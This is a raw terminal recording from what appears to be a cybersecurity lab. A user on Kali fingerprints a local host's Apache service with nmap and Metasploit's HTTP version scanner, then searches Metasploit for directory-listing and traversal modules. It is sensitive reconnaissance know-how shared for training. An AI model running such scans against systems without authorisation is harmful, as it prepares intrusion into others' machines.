@@ -1,0 +1,833 @@
+Script started on 2023-07-24 17:32:42-04:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="166" LINES="41"]
+                                                                                                                                                                      ]0;kali@kali: ~/laboratorio-ciberseguridad/80_TCP[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/laboratorio-ciberseguridad/80_TCP[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4mn[24m[4mn[24m[38;2;153;153;153metcat Http_Version__Apache__Comando_24_07_2023__17_30.txt[39m[57D[24m[36mn[36mm[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [56D[38;2;153;153;153map -sV 192.168.56.101 -p 80[39m[27D[39m[4mn[39m[4mm[39m[4ma[24m[24m[36mn[24m[36mm[24m[36ma[36mp[39m[39m [32m-[32ms[32mV[39m[39m [39m1[39m9[39m2[39m.[39m1[39m6[39m8[39m.[39m5[39m6[39m.[39m1[39m0[39m1[39m [32m-[32mp[39m[39m [39m8[39m0[?1l>[?2004l
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 17:33 EDT
+Nmap scan report for 192.168.56.101
+Host is up (0.00037s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
+                                                                                                                                                                      ]0;kali@kali: ~/laboratorio-ciberseguridad/80_TCP
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/laboratorio-ciberseguridad/80_TCP[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4mm[24m[4mm[24m[38;2;153;153;153mkdir 80_TCP[39m[11D[4mm[39m[4ms[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[38;2;153;153;153mfconsole[39m[8D[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[4mn[39m[4ms[24m[4ms[39m[4mo[24m[4mo[39m[4ml[24m[9D[24m[36mm[24m[36ms[24m[36mf[24m[36mc[24m[36mo[24m[36mn[24m[36ms[24m[36mo[24m[36ml[36me[39m[?1l>[?2004l
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|                                                  
+[0m[36m[37mCall trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        [1mthe matrix has you[0m
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com[0m
+[0m
+
+       =[ [33mmetasploit v6.3.25-dev[0m                          ]
++ -- --=[ 2332 exploits - 1219 auxiliary - 413 post       ]
++ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View advanced module options with 
+[32madvanced[0m
+Metasploit Documentation: https://docs.metasploit.com/
+
+[?1034h[4mmsf6[0m [0m> search http_ver
+[0m
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank    Check  Description
+   -  ----                                   ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/[45mhttp_ver[0msion                     normal  No     HTTP Version Detection
+   1  exploit/multi/http/nostromo_code_exec  2019-10-20       good    Yes    Nostromo Directory Traversal Remote Command Execution
+
+
+Interact with a module by name or index. For example [32minfo 1[0m, [32muse 1[0m or [32muse exploit/multi/http/nostromo_code_exec[0m
+
+[4mmsf6[0m [0m> use 0
+[0m[4mmsf6[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> set [K[K[K[Kshow options
+[0m
+Module options (auxiliary/scanner/http/http_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+   VHOST                     no        HTTP server virtual host
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> set RHOSTS 192.168.56.101
+[0mRHOSTS => 192.168.56.101
+[4mmsf6[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> show options
+[0m
+Module options (auxiliary/scanner/http/http_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.56.101   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+   VHOST                     no        HTTP server virtual host
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> run
+[0m
+[1m[32m[+][0m 192.168.56.101:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> exit
+[0m                                                                                                                                                                      ]0;kali@kali: ~/laboratorio-ciberseguridad/80_TCP
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/laboratorio-ciberseguridad/80_TCP[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4mm[24m[4mm[24m[38;2;153;153;153msfconsole[39m[9D[4mm[39m[4ms[24m[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[4mn[39m[4ms[24m[4ms[39m[4mo[24m[4mo[39m[4ml[24m[9D[24m[36mm[24m[36ms[24m[36mf[24m[36mc[24m[36mo[24m[36mn[24m[36ms[24m[36mo[24m[36ml[36me[39m[?1l>[?2004l
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\                                                  
+[0m[36m# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+[0m
+
+       =[ [33mmetasploit v6.3.25-dev[0m                          ]
++ -- --=[ 2332 exploits - 1219 auxiliary - 413 post       ]
++ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Display the Framework log using the 
+[32mlog[0m command, learn more with [32mhelp log[0m
+Metasploit Documentation: https://docs.metasploit.com/
+
+[?1034h[4mmsf6[0m [0m> d[Ksearch dir lsit
+[0m[1m[31m[-][0m No results from search
+[4mmsf6[0m [0m> search dir lsit[K[K[Kist
+[0m
+Matching Modules
+================
+
+   #   Name                                                                   Disclosure Date  Rank       Check  Description
+   -   ----                                                                   ---------------  ----       -----  -----------
+   0   exploit/linux/local/abrt_sosreport_priv_esc                            2015-11-23       [32mexcellent[0m  Yes    ABRT sosreport Privilege Escalation
+   1   exploit/linux/http/atutor_filemanager_traversal                        2016-03-01       [32mexcellent[0m  Yes    ATutor 2.2.1 [45mDir[0mectory Traversal / Remote Code Execution
+   2   auxiliary/scanner/http/apache_flink_jobmanager_traversal               2021-01-05       normal     Yes    Apache Flink JobManager Traversal
+   3   exploit/linux/smtp/apache_james_exec                                   2015-10-01       normal     Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write
+   4   exploit/windows/browser/safari_xslt_output                             2011-07-20       [32mexcellent[0m  No     Apple Safari Webkit libxslt Arbitrary File Creation
+   5   exploit/linux/local/apport_abrt_chroot_priv_esc                        2015-03-31       [32mexcellent[0m  Yes    Apport / ABRT chroot Privilege Escalation
+   6   exploit/linux/http/asuswrt_lan_rce                                     2018-01-22       [32mexcellent[0m  No     AsusWRT LAN Unauthenticated Remote Code Execution
+   7   exploit/windows/nimsoft/nimcontroller_bof                              2020-02-05       [32mexcellent[0m  Yes    CA Unified Infrastructure Management Nimsoft 7.80 - Remote Buffer Overflow
+   8   auxiliary/scanner/http/cisco_[45mdir[0mectory_traversal                       2018-06-06       normal     No     Cisco ASA [45mDir[0mectory Traversal
+   9   exploit/multi/http/cisco_dcnm_upload_2019                              2019-06-26       [32mexcellent[0m  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   10  exploit/linux/http/cisco_ucs_rce                                       2019-08-21       [32mexcellent[0m  Yes    Cisco UCS [45mDir[0mector Unauthenticated Remote Code Execution
+   11  exploit/linux/ssh/cisco_ucs_scpuser                                    2019-08-21       [32mexcellent[0m  No     Cisco UCS [45mDir[0mector default scpuser password
+   12  exploit/linux/http/dlink_dsl2750b_exec_noauth                          2016-02-05       [32mgreat[0m      Yes    D-Link DSL-2750B OS Command Injection
+   13  exploit/linux/http/multi_ncc_ping_exec                                 2015-02-26       normal     Yes    D-Link/TRENDnet NCC Service Command Injection
+   14  auxiliary/scanner/http/springcloud_[45mdir[0mectory_traversal                 2020-06-01       normal     No     [45mDir[0mectory Traversal in Spring Cloud Config Server
+   15  exploit/linux/http/dlink_hnap_login_bof                                2016-11-07       [32mexcellent[0m  Yes    Dlink [45mDIR[0m Routers Unauthenticated HNAP Login Stack Buffer Overflow
+   16  auxiliary/gather/doliwamp_traversal_creds                              2014-01-12       normal     Yes    DoliWamp 'jqueryFileTree.php' Traversal Gather Credentials
+   17  exploit/windows/ftp/ftppad_[45mlist[0m_reply                                  2010-10-12       good       No     FTPPad 1.2.0 Stack Buffer Overflow
+   18  exploit/windows/ftp/filewrangler_[45mlist[0m_reply                            2010-10-12       good       No     FileWrangler 5.30 Stack Buffer Overflow
+   19  auxiliary/scanner/http/http_traversal                                                   normal     No     Generic HTTP [45mDir[0mectory Traversal Utility
+   20  exploit/multi/http/git_lfs_clone_command_exec                          2021-04-26       [32mexcellent[0m  No     Git LFS Clone Command Exec
+   21  exploit/multi/misc/hp_data_protector_exec_integutil                    2014-10-02       [32mgreat[0m      Yes    HP Data Protector EXEC_INTEGUTIL Remote Code Execution
+   22  auxiliary/server/browser_autopwn2                                      2015-07-05       normal     No     HTTP Client Automatic Exploiter 2 (Browser Autopwn)
+   23  auxiliary/scanner/http/[45mdir[0m_[45mlist[0ming                                                      normal     No     HTTP [45mDir[0mectory [45mList[0ming Scanner
+   24  exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec          2017-05-30       [32mexcellent[0m  Yes    IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution
+   25  exploit/windows/misc/ibm_[45mdir[0mector_cim_dllinject                        2009-03-10       [32mexcellent[0m  Yes    IBM System [45mDir[0mector Agent DLL Injection
+   26  exploit/multi/misc/ibm_tm1_unauth_rce                                  2019-12-19       [32mexcellent[0m  No     IBM TM1 / Planning Analytics Unauthenticated Remote Code Execution
+   27  auxiliary/scanner/ipmi/ipmi_dumphashes                                 2013-06-20       normal     No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
+   28  auxiliary/scanner/http/icinga_static_library_file_[45mdir[0mectory_traversal  2022-05-09       normal     Yes    Icingaweb [45mDir[0mectory Traversal in Static Library File Requests
+   29  auxiliary/admin/http/kaseya_master_admin                               2015-09-23       normal     No     Kaseya VSA Master Administrator Account Creation
+   30  exploit/windows/http/kaseya_uploader                                   2015-09-23       [32mexcellent[0m  Yes    Kaseya VSA uploader.aspx Arbitrary File Upload
+   31  auxiliary/gather/ldap_query                                            2022-05-19       normal     No     LDAP Query and Enumeration Module
+   32  exploit/windows/local/cve_2017_8464_lnk_lpe                            2017-06-13       [32mgreat[0m      Yes    LNK Code Execution Vulnerability
+   33  auxiliary/scanner/rsync/modules_[45mlist[0m                                                    normal     No     [45mList[0m Rsync Modules
+   34  exploit/osx/local/persistence                                          2012-04-01       [32mexcellent[0m  No     Mac OS X Persistent Payload Installer
+   35  auxiliary/scanner/http/majordomo2_[45mdir[0mectory_traversal                  2011-03-08       normal     No     Majordomo2 _[45mlist[0m_file_get() [45mDir[0mectory Traversal
+   36  exploit/windows/misc/manageengine_eventlog_analyzer_rce                2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
+   37  auxiliary/admin/http/manageengine_[45mdir[0m_[45mlist[0ming                          2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary [45mDir[0mectory [45mList[0ming
+   38  auxiliary/admin/http/manageengine_file_download                        2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary File Download
+   39  exploit/multi/http/manageengine_auth_upload                            2014-12-15       [32mexcellent[0m  Yes    ManageEngine Multiple Products Authenticated File Upload
+   40  auxiliary/dos/windows/ftp/iis_[45mlist[0m_exhaustion                          2009-09-03       normal     No     Microsoft IIS FTP Server [45mLIST[0m Stack Exhaustion
+   41  auxiliary/admin/scada/moxa_credentials_recovery                        2015-07-28       normal     Yes    Moxa Device Credential Retrieval
+   42  auxiliary/scanner/scada/moxa_discover                                                   normal     No     Moxa UDP Device Discovery
+   43  auxiliary/spoof/nbns/nbns_response                                                      normal     No     NetBIOS Name Service Spoofer
+   44  exploit/linux/local/network_manager_vpnc_username_priv_esc             2018-07-26       [32mexcellent[0m  Yes    Network Manager VPNC Username Privilege Escalation
+   45  exploit/multi/http/novell_servicedesk_rce                              2016-03-30       [32mexcellent[0m  Yes    Novell ServiceDesk Authenticated File Upload
+   46  exploit/multi/http/zenworks_configuration_management_upload            2015-04-07       [32mexcellent[0m  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   47  exploit/linux/misc/novell_e[45mdir[0mectory_ncp_bof                           2012-12-12       normal     Yes    Novell e[45mDir[0mectory 8 Buffer Overflow
+   48  auxiliary/admin/e[45mdir[0mectory/e[45mdir[0mectory_e[45mdir[0mutil                                          normal     No     Novell e[45mDir[0mectory eMBox Unauthenticated File Access
+   49  auxiliary/gather/nuuo_cms_file_download                                2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
+   50  exploit/windows/nuuo/nuuo_cms_fu                                       2018-10-11       manual     No     Nuuo Central Management Server Authenticated Arbitrary File Upload
+   51  exploit/windows/mysql/mysql_start_up                                   2012-12-01       [32mexcellent[0m  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
+   52  exploit/linux/http/panos_readsessionvars                               2017-12-11       [32mexcellent[0m  No     Palo Alto Networks readSessionVarsFromFile() Session Corruption
+   53  auxiliary/scanner/http/glassfish_traversal                             2015-08-08       normal     No     Path Traversal in Oracle GlassFish Server Open Source Edition
+   54  exploit/windows/fileformat/proshow_load_bof                            2012-06-06       normal     No     Photodex ProShow Producer 5.0.3256 load File Handling Buffer Overflow
+   55  auxiliary/scanner/printer/printer_[45mlist[0m_[45mdir[0m                                              normal     No     Printer [45mDir[0mectory [45mList[0ming Scanner
+   56  exploit/linux/ftp/proftp_sreplace                                      2006-11-26       [32mgreat[0m      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   57  auxiliary/scanner/sap/sap_soap_rfc_eps_get_[45mdir[0mectory_[45mlist[0ming                            normal     No     SAP SOAP RFC EPS_GET_[45mDIR[0mECTORY_[45mLIST[0mING [45mDir[0mectories Information Disclosure
+   58  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_[45mdir[0m                                         normal     No     SAP SOAP RFC RZL_READ_[45mDIR[0m_LOCAL [45mDir[0mectory Contents [45mList[0ming
+   59  auxiliary/scanner/sap/sap_web_gui_brute_login                                           normal     No     SAP Web GUI Login Brute Forcer
+   60  auxiliary/admin/smb/[45mlist[0m_[45mdir[0mectory                                                      normal     No     SMB [45mDir[0mectory [45mList[0ming Utility
+   61  exploit/linux/http/samsung_srv_1670d_upload_exec                       2017-03-14       good       Yes    Samsung SRN-1670D Web Viewer Version 1.0.0.193 Arbitrary File Read and Upload
+   62  auxiliary/scanner/http/simple_webserver_traversal                      2013-01-03       normal     No     Simple Web Server 2.3-RC1 [45mDir[0mectory Traversal
+   63  auxiliary/scanner/http/springcloud_traversal                           2019-04-17       normal     No     Spring Cloud Config Server [45mDir[0mectory Traversal
+   64  exploit/multi/http/sugarcrm_webshell_cve_2023_22952                    2022-12-28       good       No     SugarCRM unauthenticated Remote Code Execution (RCE)
+   65  exploit/windows/browser/java_ws_vmargs                                 2012-02-14       [32mexcellent[0m  No     Sun Java Web Start Plugin Command Line Argument Injection
+   66  exploit/multi/http/sysaid_auth_file_upload                             2015-06-03       [32mexcellent[0m  Yes    SysAid Help Desk Administrator Portal Arbitrary File Upload
+   67  auxiliary/admin/http/sysaid_file_download                              2015-06-03       normal     No     SysAid Help Desk Arbitrary File Download
+   68  exploit/linux/http/zimbra_cpio_cve_2022_41352                          2022-06-28       [32mexcellent[0m  No     TAR Path Traversal in Zimbra (CVE-2022-41352)
+   69  exploit/linux/http/tp_link_ncxxx_bonjour_command_injection             2020-04-29       [32mexcellent[0m  No     TP-Link Cloud Cameras NCXXX Bonjour Command Injection
+   70  auxiliary/scanner/http/tvt_nvms_traversal                              2019-12-12       normal     No     TVT NVMS-1000 [45mDir[0mectory Traversal
+   71  auxiliary/scanner/http/titan_ftp_admin_pwd                                              normal     No     Titan FTP Administrative Password Disclosure
+   72  auxiliary/scanner/ftp/titanftp_xcrc_traversal                          2010-06-15       normal     No     Titan FTP XCRC [45mDir[0mectory Traversal Information Disclosure
+   73  auxiliary/scanner/http/totaljs_traversal                               2019-02-18       normal     Yes    Total.js prior to 3.2.4 [45mDir[0mectory Traversal
+   74  auxiliary/admin/officescan/tm[45mlist[0men_traversal                                           normal     No     TrendMicro OfficeScanNT [45mList[0mener Traversal Arbitrary File Access
+   75  exploit/linux/http/trueonline_billion_5200w_rce                        2016-12-26       [32mexcellent[0m  No     TrueOnline / Billion 5200W-T Router Unauthenticated Command Injection
+   76  exploit/linux/http/trueonline_p660hn_v1_rce                            2016-12-26       [32mexcellent[0m  Yes    TrueOnline / ZyXEL P660HN-T v1 Router Unauthenticated Command Injection
+   77  exploit/linux/http/trueonline_p660hn_v2_rce                            2016-12-26       [32mexcellent[0m  Yes    TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection
+   78  auxiliary/admin/backupexec/dump                                                         normal     No     Veritas Backup Exec Windows Remote File Access
+   79  exploit/multi/http/webnms_file_upload                                  2016-07-04       [32mexcellent[0m  Yes    WebNMS Framework Server Arbitrary File Upload
+   80  auxiliary/admin/http/webnms_file_download                              2016-07-04       normal     No     WebNMS Framework Server Arbitrary Text File Download
+   81  auxiliary/scanner/http/wildfly_traversal                               2014-10-22       normal     No     WildFly [45mDir[0mectory Traversal
+   82  exploit/windows/local/cve_2021_40449                                   2021-10-12       good       Yes    Win32k NtG[45mdiR[0mesetDC Use After Free Local Privilege Elevation
+   83  post/windows/gather/enum_ad_to_word[45mlist[0m                                                 normal     No     Windows Active [45mDir[0mectory Word[45mlist[0m Builder
+   84  post/windows/gather/enum_ad_managedby_groups                                            normal     No     Windows Gather Active [45mDir[0mectory Managed Groups
+   85  post/windows/gather/enum_ad_users                                                       normal     No     Windows Gather Active [45mDir[0mectory Users
+   86  post/windows/gather/enum_[45mdir[0mperms                                                       normal     No     Windows Gather [45mDir[0mectory Permissions Enumeration
+   87  auxiliary/scanner/http/wp_easy_wp_smtp                                 2020-12-06       normal     No     WordPress Easy WP SMTP Password Reset
+   88  exploit/linux/http/xplico_exec                                         2017-10-29       [32mexcellent[0m  Yes    Xplico Remote Code Execution
+   89  exploit/linux/local/glibc_origin_expansion_priv_esc                    2010-10-18       [32mexcellent[0m  Yes    glibc '$ORIGIN' Expansion Privilege Escalation
+   90  exploit/osx/browser/osx_gatekeeper_bypass                              2021-03-25       manual     No     macOS Gatekeeper check bypass
+   91  exploit/multi/http/phpldapadmin_query_engine                           2011-10-24       [32mexcellent[0m  Yes    phpLDAPadmin query_engine Remote PHP Code Injection
+   92  exploit/unix/http/tnftp_savefile                                       2014-10-28       [32mexcellent[0m  No     tnftp "savefile" Arbitrary Command Execution
+
+
+Interact with a module by name or index. For example [32minfo 92[0m, [32muse 92[0m or [32muse exploit/unix/http/tnftp_savefile[0m
+
+[4mmsf6[0m [0m> search dir scanner
+[0m
+Matching Modules
+================
+
+   #    Name                                                                   Disclosure Date  Rank    Check  Description
+   -    ----                                                                   ---------------  ----    -----  -----------
+   0    auxiliary/[45mscanner[0m/http/a10networks_ax_[45mdir[0mectory_traversal              2014-01-28       normal  No     A10 Networks AX Loadbalancer [45mDir[0mectory Traversal
+   1    auxiliary/[45mscanner[0m/http/accellion_fta_statecode_file_read               2015-07-10       normal  No     Accellion FTA 'statecode' Cookie Arbitrary File Read
+   2    auxiliary/[45mscanner[0m/http/apache_user[45mdir[0m_enum                                              normal  No     Apache "mod_user[45mdir[0m" User Enumeration
+   3    auxiliary/[45mscanner[0m/http/apache_activemq_traversal                                        normal  No     Apache ActiveMQ [45mDir[0mectory Traversal
+   4    auxiliary/[45mscanner[0m/http/apache_flink_jobmanager_traversal               2021-01-05       normal  Yes    Apache Flink JobManager Traversal
+   5    auxiliary/[45mscanner[0m/http/barracuda_[45mdir[0mectory_traversal                   2010-10-08       normal  No     Barracuda Multiple Product "locale" [45mDir[0mectory Traversal
+   6    auxiliary/[45mscanner[0m/ftp/bison_ftp_traversal                              2015-09-28       normal  Yes    BisonWare BisonFTP Server 3.5 [45mDir[0mectory Traversal Information Disclosure
+   7    auxiliary/[45mscanner[0m/http/bitweaver_overlay_type_traversal                2012-10-23       normal  No     Bitweaver overlay_type [45mDir[0mectory Traversal
+   8    auxiliary/[45mscanner[0m/http/cassandra_web_file_read                                          normal  Yes    Cassandra Web File Read Vulnerability
+   9    auxiliary/[45mscanner[0m/chargen/chargen_probe                                1996-02-08       normal  No     Chargen Probe Utility
+   10   auxiliary/[45mscanner[0m/http/cisco_[45mdir[0mectory_traversal                       2018-06-06       normal  No     Cisco ASA [45mDir[0mectory Traversal
+   11   auxiliary/[45mscanner[0m/http/cisco_firepower_download                        2016-10-10       normal  No     Cisco Firepower Management Console 6.0 Post Auth Report Download [45mDir[0mectory Traversal
+   12   auxiliary/[45mscanner[0m/http/cisco_nac_manager_traversal                                      normal  No     Cisco Network Access Manager [45mDir[0mectory Traversal Vulnerability
+   13   auxiliary/[45mscanner[0m/http/citrix_[45mdir[0m_traversal                            2019-12-17       normal  No     Citrix ADC (NetScaler) [45mDir[0mectory Traversal [45mScanner[0m
+   14   auxiliary/[45mscanner[0m/http/clansphere_traversal                            2012-10-23       normal  No     ClanSphere 2011.3 Local File Inclusion Vulnerability
+   15   auxiliary/[45mscanner[0m/http/coldfusion_locale_traversal                                      normal  No     ColdFusion Server Check
+   16   auxiliary/[45mscanner[0m/ftp/colorado_ftp_traversal                           2016-08-11       normal  Yes    ColoradoFTP Server 1.3 Build 8 [45mDir[0mectory Traversal Information Disclosure
+   17   auxiliary/[45mscanner[0m/http/dlink_[45mdir[0m_300_615_http_login                                     normal  No     D-Link [45mDIR[0m-300A / [45mDIR[0m-320 / [45mDIR[0m-615D HTTP Login Utility
+   18   auxiliary/[45mscanner[0m/http/dlink_[45mdir[0m_session_cgi_http_login                                 normal  No     D-Link [45mDIR[0m-300B / [45mDIR[0m-600B / [45mDIR[0m-815 / [45mDIR[0m-645 HTTP Login Utility
+   19   auxiliary/[45mscanner[0m/http/dlink_[45mdir[0m_615h_http_login                                        normal  No     D-Link [45mDIR[0m-615H HTTP Login Utility
+   20   auxiliary/[45mscanner[0m/http/dlink_user_agent_backdoor                       2013-10-12       normal  No     D-Link User-Agent Backdoor [45mScanner[0m
+   21   auxiliary/[45mscanner[0m/smb/impacket/secretsdump                                              normal  No     DCOM Exec
+   22   auxiliary/[45mscanner[0m/http/dicoogle_traversal                              2018-07-11       normal  No     Dicoogle PACS Web Server [45mDir[0mectory Traversal
+   23   auxiliary/[45mscanner[0m/http/[45mdir[0mectadmin_login                                                normal  No     [45mDir[0mectAdmin Web Control Panel Login Utility
+   24   auxiliary/[45mscanner[0m/http/springcloud_[45mdir[0mectory_traversal                 2020-06-01       normal  No     [45mDir[0mectory Traversal in Spring Cloud Config Server
+   25   auxiliary/[45mscanner[0m/http/dnalims_file_retrieve                           2017-03-08       normal  No     DnaLIMS [45mDir[0mectory Traversal
+   26   auxiliary/[45mscanner[0m/http/drupal_views_user_enum                          2010-07-02       normal  Yes    Drupal Views Module Users Enumeration
+   27   auxiliary/[45mscanner[0m/ftp/easy_file_sharing_ftp                            2017-03-07       normal  Yes    Easy File Sharing FTP Server 3.6 [45mDir[0mectory Traversal
+   28   auxiliary/[45mscanner[0m/http/elasticsearch_traversal                                          normal  Yes    ElasticSearch Snapshot API [45mDir[0mectory Traversal
+   29   auxiliary/[45mscanner[0m/http/goahead_traversal                                                normal  No     Embedthis GoAhead Embedded Web Server [45mDir[0mectory Traversal
